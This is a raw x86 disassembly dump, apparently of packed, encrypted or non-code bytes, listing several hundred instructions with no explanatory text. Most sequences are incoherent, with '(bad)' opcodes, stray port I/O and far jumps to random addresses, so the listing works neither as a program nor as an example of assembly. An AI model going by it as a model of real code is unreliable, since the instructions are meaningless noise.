  4059de:	jo     0x4059d9
  4059e0:	aaa    
  4059e1:	pop    ebx
  4059e2:	mov    DWORD PTR [eax+0x5],edx
  4059e5:	lods   eax,DWORD PTR ds:[esi]
  4059e6:	fcomp  DWORD PTR [ebp-0x49]
  4059e9:	xor    esp,ebp
  4059eb:	fwait
  4059ec:	cs push es
  4059ee:	or     DWORD PTR [edx],esi
  4059f0:	mov    al,ds:0x92efac46
  4059f5:	scas   al,BYTE PTR es:[edi]
  4059f6:	lahf   
  4059f7:	xor    eax,0x5dbb4f4e
  4059fc:	scas   al,BYTE PTR es:[edi]
  4059fd:	xchg   esi,eax
  4059fe:	add    BYTE PTR [esp+eiz*8],dh
  405a01:	ret    
  405a02:	jo     0x40598e
  405a04:	push   es
  405a05:	pop    edi
  405a06:	push   ebp
  405a07:	xchg   esi,eax
  405a08:	outs   dx,DWORD PTR ds:[esi]
  405a09:	or     al,BYTE PTR [edx+ebp*8+0x46a2cbc0]
  405a10:	cmp    eax,0x47bf940d
  405a15:	sub    ch,BYTE PTR [edx]
  405a17:	push   ecx
  405a18:	stc    
  405a19:	loope  0x4059d7
  405a1b:	retf   0x8da6
  405a1e:	mov    ecx,0xf907a4cd
  405a23:	adc    DWORD PTR [ebp+0x7a],eax
  405a26:	sar    BYTE PTR [esi+ecx*8+0x18],0xa1
  405a2b:	ins    DWORD PTR es:[edi],dx
  405a2c:	jbe    0x405a64
  405a2e:	xchg   edi,eax
  405a2f:	push   esi
  405a30:	sbb    ch,BYTE PTR [ebp-0x49]
  405a33:	xor    dh,BYTE PTR [ecx-0x28cb4389]
  405a39:	adc    esi,DWORD PTR [eax-0x4a6d7a3a]
  405a3f:	scas   al,BYTE PTR es:[edi]
  405a40:	jns    0x405a3f
  405a42:	imul   ebp,DWORD PTR [eax],0xc7b8e381
  405a48:	sbb    edx,DWORD PTR ds:0x9eab99ff
  405a4e:	pop    edx
  405a4f:	sahf   
  405a50:	int3   
  405a51:	(bad)  
  405a52:	shl    BYTE PTR [edi],0x73
  405a55:	push   esi
  405a56:	inc    esi
  405a57:	in     eax,0x37
  405a59:	jl     0x405a1e
  405a5b:	or     al,0xb5
  405a5d:	ss repnz mov dl,0x9
  405a61:	repz push ss
  405a63:	(bad)
  405a66:	enter  0xe01,0x3c
  405a6a:	dec    BYTE PTR [edx+ebp*8]
  405a6d:	es aam 0x75
  405a70:	icebp  
  405a71:	jmp    0x405a1a
  405a73:	imul   esp,DWORD PTR [ebx-0xfa0c4b7],0x3d
  405a7a:	gs sbb eax,0x3edea4b7
  405a80:	inc    eax
  405a81:	sti    
  405a82:	adc    BYTE PTR [edx],cl
  405a84:	mov    DWORD PTR [edx],esp
  405a86:	pop    edi
  405a87:	cdq    
  405a88:	pusha  
  405a89:	retf   0x350c
  405a8c:	pop    es
  405a8d:	sti    
  405a8e:	out    dx,al
  405a8f:	adc    DWORD PTR [ebx+eax*2+0x2f0624cc],edi
  405a96:	jo     0x405acb
  405a98:	shl    DWORD PTR [ebx-0x72],0x2b
  405a9c:	mov    ds:0xa208d672,eax
  405aa1:	jns    0x405a9b
  405aa3:	jno    0x405b05
  405aa5:	fbstp  TBYTE PTR [ebx-0x6e]
  405aa8:	sti    
  405aa9:	jb     0x405aa9
  405aab:	(bad)  
  405aac:	xor    edi,DWORD PTR [eax-0x23ffbd57]
  405ab2:	mov    ebx,0xad27dde6
  405ab7:	mov    cl,0x8b
  405ab9:	pop    esp
  405aba:	pop    ebp
  405abb:	test   al,0x17
  405abd:	cld    
  405abe:	sub    dl,cl
  405ac0:	loope  0x405b0c
  405ac2:	inc    ebp
  405ac3:	mov    bl,0xff
  405ac5:	mov    bl,0x4
  405ac7:	icebp  
  405ac8:	aad    0x58
  405aca:	and    al,0x1d
  405acc:	(bad)  [edx+0x60e184e6]
  405ad2:	outs   dx,DWORD PTR ds:[esi]
  405ad3:	push   esi
  405ad4:	test   eax,0xdecbe60a
  405ad9:	mov    esi,0xcdd31e3e
  405ade:	push   esp
  405adf:	xlat   BYTE PTR ds:[ebx]
  405ae0:	xchg   ecx,eax
  405ae1:	scas   eax,DWORD PTR es:[edi]
  405ae2:	jecxz  0x405b3f
  405ae4:	sbb    edx,DWORD PTR [ebx-0x2c753c08]
  405aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aeb:	cmp    cl,BYTE PTR [ebx+0x63]
  405aee:	and    BYTE PTR [edi-0x61f8d8d0],cl
  405af4:	sub    eax,0xb9646c1f
  405af9:	inc    eax
  405afa:	stos   BYTE PTR es:[edi],al
  405afb:	out    dx,eax
  405afc:	aam    0x73
  405afe:	xlat   BYTE PTR ds:[ebx]
  405aff:	std    
  405b00:	cs leave 
  405b02:	test   BYTE PTR [edi-0x4205afe1],0x2d
  405b09:	stos   DWORD PTR es:[edi],eax
  405b0a:	sub    al,0x8b
  405b0c:	mov    ebx,0xfad7a579
  405b11:	dec    ebx
  405b12:	cmp    edx,DWORD PTR [edx]
  405b14:	pusha  
  405b15:	mov    ds:0xca31b19a,eax
  405b1a:	xchg   esp,eax
  405b1b:	int    0x1d
  405b1d:	or     ch,cl
  405b1f:	adc    ebx,DWORD PTR [edi]
  405b21:	imul   esp,DWORD PTR [edi],0xffffff89
  405b24:	push   eax
  405b25:	shl    BYTE PTR [eax+eiz*1-0x2e],cl
  405b29:	cmp    esi,DWORD PTR [ebx]
  405b2b:	push   es
  405b2c:	ins    DWORD PTR es:[edi],dx
  405b2d:	cmp    dh,BYTE PTR ds:0x936adf10
  405b33:	push   ss
  405b34:	shl    ch,1
  405b36:	mov    ebx,0x1b913343
  405b3b:	lods   al,BYTE PTR ds:[esi]
  405b3c:	jnp    0x405bbd
  405b3e:	mov    ah,0x7f
  405b40:	pop    es
  405b41:	js     0x405b7f
  405b43:	jb     0x405ac5
  405b45:	cmc    
  405b46:	add    ah,ch
  405b48:	mov    ch,0x9e
  405b4a:	cmp    ah,dl
  405b4c:	dec    esi
  405b4d:	jb     0x405b41
  405b4f:	add    ch,dl
  405b51:	lea    edi,[esi+0x36]
  405b54:	inc    esp
  405b55:	cmp    al,0x1d
  405b57:	or     edx,DWORD PTR [esi]
  405b59:	into   
  405b5a:	loop   0x405b38
  405b5c:	in     eax,dx
  405b5d:	lods   eax,DWORD PTR ds:[esi]
  405b5e:	(bad)  
  405b5f:	loopne 0x405b8a
  405b61:	dec    edx
  405b62:	xor    cl,cl
  405b64:	mov    ds:0x62f58322,eax
  405b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b6a:	jbe    0x405bae
  405b6c:	fs dec eax
  405b6e:	int    0x59
  405b70:	pop    ebx
  405b71:	retf   0x837
  405b74:	sub    BYTE PTR [esi],cl
  405b76:	lods   eax,DWORD PTR ds:[esi]
  405b77:	mov    edx,0xb2998815
  405b7c:	bound  ebp,QWORD PTR [ebx-0x4c]
  405b7f:	xchg   edx,eax
  405b80:	sti    
  405b81:	dec    esp
  405b82:	stos   DWORD PTR es:[edi],eax
  405b83:	jecxz  0x405bb9
  405b85:	cdq    
  405b86:	sar    ah,1
  405b88:	fcomp  QWORD PTR [edi]
  405b8a:	cmp    DWORD PTR ds:0x6ee3d8eb,ebp
  405b90:	mov    edi,0x8c9122a2
  405b95:	scas   al,BYTE PTR es:[edi]
  405b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b97:	sub    BYTE PTR [eax],dh
  405b99:	int    0x45
  405b9b:	jo     0x405bea
  405b9d:	xor    DWORD PTR [eax+0x75c4a3b],ebp
  405ba3:	test   esi,0xf2005166
  405ba9:	lods   al,BYTE PTR ds:[esi]
  405baa:	inc    ecx
  405bab:	fisttp QWORD PTR [edx+eax*4]
  405bae:	fisub  DWORD PTR [edi-0x4]
  405bb1:	daa    
  405bb2:	pushf  
  405bb3:	sbb    eax,0x39e49f21
  405bb8:	popa   
  405bb9:	jp     0x405bd6
  405bbb:	loopne 0x405be2
  405bbd:	jae    0x405c1a
  405bbf:	or     DWORD PTR [ecx+0x105f29e],esp
  405bc5:	and    ecx,DWORD PTR [edx+ebx*4+0x7d]
  405bc9:	xchg   edx,eax
  405bca:	loop   0x405bdc
  405bcc:	fs jb  0x405bde
  405bcf:	xor    BYTE PTR [ecx+0x510b1f],bl
  405bd5:	mov    es:0xc1ffb71a,al
  405bdb:	adc    DWORD PTR [ecx-0x6a],ebx
  405bde:	das    
  405bdf:	fwait
  405be0:	je     0x405c26
  405be2:	xor    DWORD PTR [eax-0x7d47a8bb],ebx
  405be8:	add    al,0x55
  405bea:	xor    bl,BYTE PTR [edi+0x71b563b9]
  405bf0:	es leave 
  405bf2:	fmul   QWORD PTR [esi-0x432d1e76]
  405bf8:	cmc    
  405bf9:	mov    ebp,0xe16fa273
  405bfe:	jae    0x405c47
  405c00:	xchg   ebp,eax
  405c01:	xlat   BYTE PTR ds:[ebx]
  405c02:	sbb    esi,DWORD PTR [ebx+0x26]
  405c05:	and    al,0x7c
  405c07:	mov    edi,0x219bac04
  405c0c:	adc    eax,0x4413916c
  405c11:	inc    edi
  405c12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c13:	mov    ecx,0xb8e92cd2
  405c18:	xabort 0x94
  405c1b:	jbe    0x405bbd
  405c1d:	call   0xe14e:0xf2346734
  405c24:	mov    ch,0xd6
  405c26:	retf   
  405c27:	mov    esi,0xe9fec9ae
  405c2c:	fld    QWORD PTR [ebx+0x5c705699]
  405c32:	mov    al,0xdb
  405c34:	adc    esi,DWORD PTR [ebp+0x4f0daa74]
  405c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c3b:	push   ebx
  405c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c3d:	push   0xffffff97
  405c3f:	mov    DWORD PTR [ebp+0x20],edi
  405c42:	xchg   edx,eax
  405c43:	daa    
  405c44:	stos   BYTE PTR es:[edi],al
  405c45:	or     DWORD PTR [edx+0x2d],esi
  405c48:	js     0x405c98
  405c4a:	push   cs
  405c4b:	fs inc ebx
  405c4d:	clc    
  405c4e:	js     0x405c3d
  405c50:	mov    dh,0xe1
  405c52:	cmp    eax,0x16e20371
  405c57:	shr    BYTE PTR [esi+0x17],0x43
  405c5b:	xchg   esi,eax
  405c5c:	adc    bl,BYTE PTR [ebp+0x47c94ae0]
  405c62:	sahf   
  405c63:	jp     0x405c42
  405c65:	xor    eax,0xec47c605
  405c6a:	clc    
  405c6b:	shl    BYTE PTR [ebx+0x4c],cl
  405c6e:	push   0x66
  405c70:	add    DWORD PTR [eax],edx
  405c72:	adc    DWORD PTR [ebx-0x59],esi
  405c75:	hlt    
  405c76:	xor    ch,BYTE PTR [ecx]
  405c78:	push   0x1
  405c7a:	mov    ecx,0x4258421e
  405c7f:	mov    edx,0x95388cbd
  405c84:	add    eax,0xf70184f3
  405c89:	cld    
  405c8a:	sbb    bh,dh
  405c8c:	xor    dh,cl
  405c8e:	lea    esi,[edx-0x290084af]
  405c94:	jno    0x405d08
  405c96:	fs ins DWORD PTR es:[edi],dx
  405c98:	cwde   
  405c99:	jmp    0x5998:0xe5fe76af
  405ca0:	dec    ebx
  405ca1:	call   0x6388d46b
  405ca6:	cmp    bh,BYTE PTR [ecx-0x63]
  405ca9:	jno    0x405ce9
  405cab:	sbb    edi,eax
  405cad:	cld    
  405cae:	(bad)  
  405cb0:	push   eax
  405cb1:	and    esp,0xffffffff
  405cb4:	(bad)  
  405cb5:	jl     0x405cf7
  405cb7:	neg    BYTE PTR [edi+0x7c]
  405cba:	mov    eax,0xc26f2439
  405cbf:	push   cs
  405cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cc1:	pop    es
  405cc2:	add    ecx,ebp
  405cc4:	jge    0x405c54
  405cc6:	push   0xd1b5df68
  405ccb:	leave  
  405ccc:	jns    0x405c64
  405cce:	adc    cl,ah
  405cd0:	inc    ecx
  405cd1:	push   eax
  405cd2:	das    
  405cd3:	adc    eax,0x53bf34d
  405cd8:	and    esi,0x76
  405cdb:	sti    
  405cdc:	mov    eax,ds:0x95284538
  405ce1:	out    dx,al
  405ce2:	or     eax,0xedbb80f4
  405ce7:	shl    edx,0x82
  405cea:	sbb    ebp,edx
  405cec:	(bad)  
  405ced:	stos   DWORD PTR es:[edi],eax
  405cee:	fisubr DWORD PTR [edx+ecx*2+0x4d]
  405cf2:	je     0x405cbe
  405cf4:	cli    
  405cf5:	aam    0x9f
  405cf7:	scas   eax,DWORD PTR es:[edi]
  405cf8:	push   0x15
  405cfa:	neg    ecx
  405cfc:	lahf   
  405cfd:	push   0x3c
  405cff:	lea    ecx,[esi+0x3a89f9dc]
  405d05:	inc    ecx
  405d06:	pop    eax
  405d07:	xor    BYTE PTR [esi],0x88
  405d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d0b:	mov    esp,0xa5820938
  405d10:	in     al,0x8f
  405d12:	jo     0x405ce2
  405d14:	jbe    0x405d2b
  405d16:	fimul  WORD PTR [ecx-0x1d]
  405d19:	stc    
  405d1a:	xchg   edx,eax
  405d1b:	mov    ch,0x2d
  405d1d:	sbb    DWORD PTR [edx-0x59],esi
  405d20:	sub    bh,0xb2
  405d23:	mov    ds:0x8a7da96a,eax
  405d28:	mov    cl,0x15
  405d2a:	and    al,0xe6
  405d2c:	xchg   esp,eax
  405d2d:	cmp    DWORD PTR [edi+0x2d2b8e3d],eax
  405d33:	shl    DWORD PTR [esi+0x2373ec1a],cl
  405d39:	fld    QWORD PTR [eax-0x216a34c0]
  405d3f:	mov    BYTE PTR [edi+edi*2-0x188c8bf7],al
  405d46:	mov    eax,ds:0xf8c03100
  405d4b:	inc    ecx
  405d4c:	loop   0x405dab
  405d4e:	leave  
  405d4f:	and    eax,0xb6287fb8
  405d54:	into   
  405d55:	mov    esi,0x5c0aa57c
  405d5a:	cmp    al,BYTE PTR [ebp-0x78]
  405d5d:	stc    
  405d5e:	pop    es
  405d5f:	scas   al,BYTE PTR es:[edi]
  405d60:	rcl    DWORD PTR [edi+0x13],cl
  405d63:	pop    eax
  405d64:	or     al,BYTE PTR [ecx+ebp*2+0x3ef6d328]
  405d6b:	out    dx,eax
  405d6c:	out    dx,al
  405d6d:	sbb    DWORD PTR [si-0x5d09],esi
  405d72:	or     BYTE PTR [eax],dl
  405d74:	(bad)  
  405d75:	in     eax,0xa0
  405d77:	dec    ecx
  405d78:	int3   
  405d79:	cwde   
  405d7a:	mov    ebp,0xc67cbe44
  405d7f:	push   esi
  405d80:	sbb    dl,BYTE PTR [edi]
  405d82:	out    0xb,eax
  405d84:	jmp    0x6f77a2d0
  405d89:	pop    ss
  405d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d8b:	int3   
  405d8c:	imul   ecx,edx,0x10aa2e79
  405d92:	or     BYTE PTR [esi-0x34b9b751],al
  405d98:	cmp    eax,0x2ef06fef
  405d9d:	(bad)  
  405d9e:	pop    edi
  405d9f:	sbb    eax,0x70e080f9
  405da4:	shl    bl,1
  405da6:	in     al,0x5c
  405da8:	dec    edx
  405da9:	push   cs
  405daa:	adc    edi,edi
  405dac:	mov    eax,0xb8700b0e
  405db1:	rol    bl,0xb4
  405db4:	int    0xe0
  405db6:	dec    ebp
  405db7:	pushw  cs
  405db9:	push   ds
  405dba:	mov    cl,0x6b
  405dbc:	lods   al,BYTE PTR ds:[esi]
  405dbd:	mov    ebp,0x84882583
  405dc2:	cmp    cl,dl
  405dc4:	jo     0x405da3
  405dc6:	xchg   esi,eax
  405dc7:	mov    BYTE PTR [eax+0x5],dl
  405dca:	push   eax
  405dcb:	repnz ins DWORD PTR es:[edi],dx
  405dcd:	scas   eax,DWORD PTR es:[edi]
  405dce:	xchg   BYTE PTR [eax-0x2ecdf131],bh
  405dd4:	cmc    
  405dd5:	retf   
  405dd6:	sbb    eax,0x51aa2419
  405ddb:	mov    DWORD PTR [ebp-0x22689873],esp
  405de1:	xchg   BYTE PTR [edi+0x49],ah
  405de4:	fcmovnb st,st(4)
  405de6:	repnz add BYTE PTR [ebp-0xc14cbf0],0x6f
  405dee:	ficomp WORD PTR [ebx+0x78]
  405df1:	cmp    DWORD PTR [ebp+0x64],ebp
  405df4:	add    BYTE PTR [ecx+0x7a],dl
  405df7:	mov    DWORD PTR [eax-0x19c43455],ebx
  405dfd:	test   dh,ch
  405dff:	lds    esi,FWORD PTR [esi]
  405e01:	dec    esi
  405e02:	xor    BYTE PTR [eax+0x54],dl
  405e05:	call   0xada9:0xaace2c4c
  405e0c:	sub    cl,bh
  405e0e:	push   esi
  405e0f:	jmp    0x405e77
  405e11:	(bad)  
  405e12:	mov    al,ds:0x96018aa6
  405e17:	lods   al,BYTE PTR ds:[esi]
  405e18:	jo     0x405e42
  405e1a:	cli    
  405e1b:	sub    eax,0xc16a8eb1
  405e20:	int3   
  405e21:	ja     0x405df9
  405e23:	mov    eax,0xa358ddc6
  405e28:	ds jge 0x405e01
  405e2b:	inc    ecx
  405e2c:	mov    BYTE PTR [ebp-0x34],0x17
  405e30:	in     eax,0x86
  405e32:	cli    
  405e33:	daa    
  405e34:	inc    edx
  405e35:	adc    DWORD PTR [edi-0x77],esi
  405e38:	add    al,0xad
  405e3a:	data16 mul BYTE PTR [edi]
  405e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e3e:	aam    0x92
  405e40:	frstor [ebx]
  405e42:	xor    DWORD PTR [ecx+0x29973eb7],edx
  405e48:	jmp    0x5a6d2fb4
  405e4d:	pop    ecx
  405e4e:	xchg   edi,eax
  405e4f:	sub    cl,bh
  405e51:	jno    0x405e11
  405e53:	or     DWORD PTR [ecx],0xffffff8f
  405e56:	ret    
  405e57:	cld    
  405e58:	popa   
  405e59:	fsub   st,st(5)
  405e5b:	pop    ss
  405e5c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e5e:	shr    DWORD PTR [edx+0x30ee7f12],1
  405e64:	in     eax,0x32
  405e66:	jge    0x405e9a
  405e68:	and    al,0x71
  405e6a:	int    0xdf
  405e6c:	jle    0x405e32
  405e6e:	xor    ecx,DWORD PTR [eax+0x0]
  405e71:	mov    edi,cs
  405e73:	fwait
  405e74:	arpl   WORD PTR [ecx],dx
  405e76:	(bad)  
  405e77:	rcl    BYTE PTR [eax-0x759c9b7d],1
  405e7d:	cli    
  405e7e:	mov    eax,0xc2049a81
  405e83:	fist   DWORD PTR [edx+edx*8-0x16e9e36]
  405e8a:	adc    DWORD PTR [esi+0x3d],ecx
  405e8d:	fild   DWORD PTR [ebx+esi*4-0x49c66ba3]
  405e94:	fistp  DWORD PTR [ecx-0x52]
  405e97:	jecxz  0x405ef8
  405e99:	repz mov edi,0xdf39fb44
  405e9f:	pop    edi
  405ea0:	ret    0x6568
  405ea3:	sbb    dl,BYTE PTR ds:0x8ca297f3
  405ea9:	fwait
  405eaa:	repz push ebx
  405eac:	not    DWORD PTR [ecx+esi*8+0x28]
  405eb0:	call   0x471d:0xcc2dc305
  405eb7:	sbb    BYTE PTR [eax+0x97b296f],al
  405ebd:	iret   
  405ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ebf:	sub    bl,0x60
  405ec2:	sub    BYTE PTR [ebp+ebx*4+0x34],dh
  405ec6:	out    dx,eax
  405ec7:	shl    DWORD PTR [ecx],0x2d
  405eca:	dec    edi
  405ecb:	inc    esp
  405ecc:	sbb    al,0xef
  405ece:	mov    esi,DWORD PTR [ebx]
  405ed0:	jp     0x405f2f
  405ed2:	mov    es,WORD PTR [edi-0x2004d059]
  405ed8:	add    BYTE PTR gs:[bp+0xc],dh
  405edd:	loope  0x405ed5
  405edf:	dec    eax
  405ee0:	mov    dh,0x4e
  405ee2:	ins    DWORD PTR es:[edi],dx
  405ee3:	call   0x3f2caa7d
  405ee8:	lea    eax,[esi+0x49]
  405eeb:	mov    cl,0x1b
  405eed:	sbb    DWORD PTR [ebx],esi
  405eef:	pop    eax
  405ef0:	inc    ebx
  405ef1:	jle    0x405e91
  405ef3:	xchg   esp,eax
  405ef4:	fstp   TBYTE PTR ds:0xb9e1e9f4
  405efa:	leave  
  405efb:	call   0x53472977
  405f00:	xor    dl,bl
  405f02:	and    dh,bl
  405f04:	dec    esp
  405f05:	fimul  DWORD PTR [edx-0x1005c786]
  405f0b:	stos   DWORD PTR es:[edi],eax
  405f0c:	ret    
  405f0d:	mov    ebx,0x8f203236
  405f12:	add    eax,0x3181f0c9
  405f17:	(bad)  
  405f18:	mov    ecx,0x720e4b81
  405f1d:	jae    0x405f06
  405f1f:	retf   
  405f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f21:	mov    ah,0xfd
  405f23:	push   ds
  405f24:	cdq    
  405f25:	cs mov ebp,0x32e9ec9d
  405f2b:	outs   dx,DWORD PTR ds:[esi]
  405f2c:	adc    ebp,DWORD PTR [edx]
  405f2e:	in     eax,dx
  405f2f:	imul   ebp,DWORD PTR [esi-0x4f],0x6b
  405f33:	lock arpl WORD PTR [edi+0x546b9c81],di
  405f3a:	out    0x9c,eax
  405f3c:	cmp    DWORD PTR [si+0x7353],esi
  405f41:	fmul   st(6),st
  405f43:	and    edx,DWORD PTR [esi-0x1c99c507]
  405f49:	push   fs
  405f4b:	shr    BYTE PTR [ebx+0x62],cl
  405f4e:	(bad)  
  405f4f:	pop    edi
  405f50:	mov    bl,0x9
  405f52:	rol    DWORD PTR [ecx+0x3f],1
  405f55:	pop    ebx
  405f56:	(bad)  
  405f57:	in     eax,0xc6
  405f59:	push   ebx
  405f5a:	ins    DWORD PTR es:[edi],dx
  405f5b:	sbb    esp,DWORD PTR [ecx]
  405f5d:	in     eax,0x7e
  405f5f:	xchg   ebp,eax
  405f60:	fsubr  st,st(0)
  405f62:	and    ebx,DWORD PTR [esi+0x41e474fe]
  405f68:	jmp    0x33634eb6
  405f6d:	inc    esi
  405f6e:	lods   eax,DWORD PTR ds:[esi]
  405f6f:	repz add eax,0x3520b5b9
  405f75:	adc    BYTE PTR [esi-0x306c961],0xb6
  405f7c:	xor    DWORD PTR [edi-0x12d9d661],esp
  405f82:	jno    0x405f87
  405f84:	ins    DWORD PTR es:[edi],dx
  405f85:	mov    gs,eax
  405f87:	jp     0x405f23
  405f89:	jns    0x405f80
  405f8b:	aas    
  405f8c:	popa   
  405f8d:	adc    al,0xb1
  405f8f:	inc    ecx
  405f90:	xchg   al,cl
  405f92:	fisub  WORD PTR [ebx+0x30]
  405f95:	push   ss
  405f96:	stos   BYTE PTR es:[edi],al
  405f97:	inc    edi
  405f98:	addr16 in eax,0xc5
  405f9b:	fucomip st,st(1)
  405f9d:	xchg   ecx,eax
  405f9e:	dec    eax
  405f9f:	fs pop edx
  405fa1:	cmc    
  405fa2:	in     eax,0xd4
  405fa4:	mov    ds:0x30bb9ac3,al
  405fa9:	mov    ebx,0xb687c0be
  405fae:	jo     0x40601c
  405fb0:	jge    0x405fa9
  405fb2:	xor    al,0xb8
  405fb4:	mov    ah,0x46
  405fb6:	(bad)  
  405fb7:	fisub  DWORD PTR [ebp-0x61]
  405fba:	push   edx
  405fbb:	mov    BYTE PTR [edx-0x643d20bc],dl
  405fc1:	push   0xffffffbd
  405fc3:	inc    edi
  405fc4:	cmp    al,0x49
  405fc6:	imul   esi,DWORD PTR [esi],0xffffff94
  405fc9:	in     al,0x34
  405fcb:	mov    cl,0x55
  405fcd:	shl    BYTE PTR [ecx+esi*8],1
  405fd0:	les    ebp,FWORD PTR [esi+0x4616ff63]
  405fd6:	(bad)  
  405fd7:	repnz mov ds:0xbadcc08,al
  405fdd:	mov    ds:0x9a726f76,eax
  405fe2:	out    0x89,al
  405fe4:	or     esp,DWORD PTR gs:[ebp+0x52]
  405fe8:	out    dx,eax
  405fe9:	bound  edx,QWORD PTR [ebx]
  405feb:	std    
  405fec:	mov    ecx,0xf1e3822d
  405ff1:	or     BYTE PTR [edx],dl
  405ff3:	inc    BYTE PTR [ebx+0x15]
  405ff6:	lds    ecx,FWORD PTR [ebp+edx*1-0x8]
  405ffa:	or     eax,0x16b4c051
  405fff:	adc    dh,BYTE PTR [ecx-0x36]
  406002:	mov    cl,0xe
  406004:	fdiv   QWORD PTR [ebp+ebx*2-0x4b]
  406008:	lods   al,BYTE PTR ds:[esi]
  406009:	and    BYTE PTR [ebp-0x9],cl
  40600c:	aad    0x4
  40600e:	jo     0x40605c
  406010:	jg     0x40600b
  406012:	(bad)  
  406013:	out    dx,eax
  406014:	xchg   edx,eax
  406015:	dec    ecx
  406016:	out    0xa5,eax
  406018:	iret   
  406019:	xor    eax,ebp
  40601b:	xchg   BYTE PTR [edx-0x54628719],al
  406021:	retf   
  406022:	dec    eax
  406023:	or     al,0xeb
  406025:	sub    dh,ah
  406027:	mov    edx,0x919aeda1
  40602c:	xchg   edi,eax
  40602d:	jp     0x406077
  40602f:	mov    eax,0x4f32e9b3
  406034:	xor    BYTE PTR [esi],ch
  406036:	push   eax
  406037:	ret    0x8b74
  40603a:	xchg   esi,eax
  40603b:	out    0x73,eax
  40603d:	mov    ds:0x6e1ba4c4,al
  406042:	jne    0x405fdc
  406044:	or     DWORD PTR [ebx],eax
  406046:	aad    0xd0
  406048:	jl     0x406028
  40604a:	jbe    0x40608f
  40604c:	ds push eax
  40604e:	push   ss
  40604f:	push   0x19c38533
  406054:	jbe    0x406016
  406056:	je     0x405ff9
  406058:	add    esi,DWORD PTR [esi+0x55]
  40605b:	pop    ebp
  40605c:	stc    
  40605d:	nop
  40605e:	(bad)  
  40605f:	and    bl,BYTE PTR [esi-0xccc5b5a]
  406065:	imul   DWORD PTR [edi]
  406067:	out    0xd5,al
  406069:	add    dl,dh
  40606b:	dec    ebp
  40606c:	call   0x634:0x616ff60b
  406073:	popf   
  406074:	loop   0x406003
  406076:	add    ah,BYTE PTR fs:[esp+edx*4]
  40607a:	and    al,0x52
  40607c:	push   0x57221b89
  406081:	add    DWORD PTR [eax+0x56],0xf7e8508c
  406088:	cmp    DWORD PTR [edx+0x49],edi
  40608b:	xor    DWORD PTR [edi-0x14a86fa],ebx
  406091:	mov    al,0xf4
  406093:	lods   eax,DWORD PTR ds:[esi]
  406094:	inc    edi
  406095:	jo     0x4060d3
  406097:	(bad)  
  406098:	xchg   ebp,eax
  406099:	xor    al,0x4e
  40609b:	pop    edi
  40609c:	xchg   esi,eax
  40609d:	int    0xf7
  40609f:	lahf   
  4060a0:	or     ebx,eax
  4060a2:	jae    0x40605a
  4060a4:	adc    eax,0xa9d18041
  4060a9:	clc    
  4060aa:	xchg   edx,eax
  4060ab:	pop    edi
  4060ac:	int    0xd5
  4060ae:	mov    cl,0x4
  4060b0:	add    BYTE PTR [ebp*2-0x288f81c9],0xa0
  4060b8:	lods   eax,DWORD PTR ds:[esi]
  4060b9:	mov    esi,0xc210b892
  4060be:	sti    
  4060bf:	dec    esp
  4060c0:	mov    eax,ds:0xba0e471d
  4060c5:	adc    dh,dl
  4060c7:	(bad)  
  4060c8:	mov    cl,0x18
  4060ca:	data16 jle 0x4060e9
  4060cd:	mov    WORD PTR [edx+eax*4+0x49017482],fs
  4060d4:	aaa    
  4060d5:	ja     0x40611f
  4060d7:	(bad)  
  4060d8:	push   ecx
  4060d9:	xchg   edi,eax
  4060da:	push   ebx
  4060db:	(bad)  
  4060dc:	sahf   
  4060dd:	inc    esi
  4060de:	jae    0x4060d3
  4060e0:	test   eax,0xcefd0a49
  4060e5:	dec    esi
  4060e6:	out    0x5e,al
  4060e8:	loope  0x406149
  4060ea:	retf   
  4060eb:	nop
  4060ec:	adc    DWORD PTR [edi],edi
  4060ee:	fld    TBYTE PTR [edi+0x26]
  4060f1:	xchg   edx,eax
  4060f2:	daa    
  4060f3:	stos   BYTE PTR es:[edi],al
  4060f4:	icebp  
  4060f5:	xchg   bl,dl
  4060f7:	icebp  
  4060f8:	stos   BYTE PTR es:[edi],al
  4060f9:	icebp  
  4060fa:	outs   dx,BYTE PTR ds:[esi]
  4060fb:	and    dh,BYTE PTR [eax-0x67]
  4060fe:	jnp    0x406084
  406100:	xchg   ebp,eax
  406101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406102:	retf   
  406103:	adc    DWORD PTR [esi],edi
  406105:	stos   BYTE PTR es:[edi],al
  406106:	test   BYTE PTR [esi],bl
  406108:	rcl    dl,1
  40610a:	ins    DWORD PTR es:[edi],dx
  40610b:	xchg   edx,eax
  40610c:	clc    
  40610d:	std    
  40610e:	xchg   edx,eax
  40610f:	sbb    eax,0x1d9f76ca
  406114:	cmp    eax,0xb76ed753
  406119:	push   edx
  40611a:	mov    cl,0xd5
  40611c:	or     dl,BYTE PTR [edi+ebx*2-0x5b]
  406120:	arpl   si,bx
  406122:	js     0x406195
  406124:	retf   0x4a95
  406127:	jmp    0x4060d6
  406129:	(bad)  
  40612a:	shl    DWORD PTR ds:[ebx+0x4e],cl
  40612e:	mov    ch,0x44
  406130:	in     al,0x77
  406132:	mov    edi,DWORD PTR [esi+0x7]
  406135:	inc    esp
  406136:	add    eax,0x2f70718e
  40613b:	int3   
  40613c:	mov    ch,0x47
  40613e:	mov    bl,BYTE PTR [ebx-0x6e311ef7]
  406144:	arpl   WORD PTR [ebx],bp
  406146:	lds    ecx,FWORD PTR [eax]
  406148:	push   ss
  406149:	retf   0x57e2
  40614c:	test   DWORD PTR [edx+0x39daef10],edx
  406152:	je     0x4061a9
  406154:	in     al,dx
  406155:	push   edx
  406156:	fimul  DWORD PTR [esi-0x2e8e2e48]
  40615c:	stos   BYTE PTR es:[edi],al
  40615d:	and    DWORD PTR [edx],0x709789e5
  406163:	mov    ebp,0x208143fc
  406168:	ret    0x77da
  40616b:	gs mov dh,0xe6
  40616e:	jnp    0x40612a
